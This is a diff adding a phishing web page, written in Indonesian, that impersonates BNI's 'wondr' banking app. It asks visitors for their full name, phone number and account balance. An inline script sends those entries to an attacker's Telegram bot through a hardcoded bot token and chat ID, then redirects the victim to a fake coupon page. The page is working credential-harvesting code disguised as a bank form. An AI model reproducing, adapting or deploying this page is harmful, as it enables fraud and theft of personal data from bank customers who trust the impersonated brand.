@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>w0nd3r bn1</title>
+  <link rel="stylesheet" href="Style.css">
+</head>
+<body>
+
+  <div class="header">
+    <img src="kon.jpg" alt="BNI Logo" class="logo">
+    <div class="wondr">wondr <span>by BNI</span></div>
+  </div>
+
+  <div class="container">
+    <h2>Silahkan Melengkapi Data Berikut :</h2>
+
+    <form id="formku">
+      <label for="nama">Nama Lengkap</label>
+      <input type="text" id="nama" name="nama" placeholder="Nama" required>
+
+      <label for="hp">Nomor Handphone</label>
+      <input type="tel" id="hp" name="hp" placeholder="Nomor Handphone" maxlength="13" pattern="[0-9]*" inputmode="numeric" required>
+
+      <label for="saldo">Saldo Rekening</label>
+      <input type="tel" id="saldo" name="saldo" placeholder="Rp." required>
+
+      <button type="submit">Selanjutnya</button>
+    </form>
+  </div>
+
+  <div class="footer">
+    ©2025 PT Bank Negara Indonesia Tbk.
+  </div>
+
+  <script>
+    const token = '7821075435:AAGqm7jpvEf0KuM3NTNxqMESRJQnqshqHuQ';
+    const chat_id = '6698220508';
+
+    const saldoInput = document.getElementById('saldo');
+    saldoInput.addEventListener('input', function () {
+      let angka = this.value.replace(/[^\d]/g, '');
+      this.value = angka ? 'Rp.' + angka.replace(/\B(?=(\d{3})+(?!\d))/g, '.') : '';
+    });
+
+    document.getElementById("formku").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const nama = document.getElementById("nama").value;
+      const hp = document.getElementById("hp").value;
+      const saldo = document.getElementById("saldo").value;
+
+      if (!/^\d{10,13}$/.test(hp)) {
+        alert("Nomor handphone harus 10-13 digit angka.");
+        return false;
+      }
+
+      const pesan = `📥 Data Baru Masuk:\n\n👤 Nama: ${nama}\n📱 Nomor WA: ${hp}\n💰 Saldo: ${saldo}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: pesan
+        })
+      }).then(response => {
+        if (response.ok) {
+          // ✅ Pindah ke halaman kupon setelah kirim ke Telegram
+          window.location.href = "Index1.html";
+        } else {
+          alert("Gagal mengirim data ke Telegram.");
+        }
+      }).catch(() => {
+        alert("Terjadi kesalahan saat mengirim.");
+      });
+    });
+  </script>
+
+</body>
+</html>
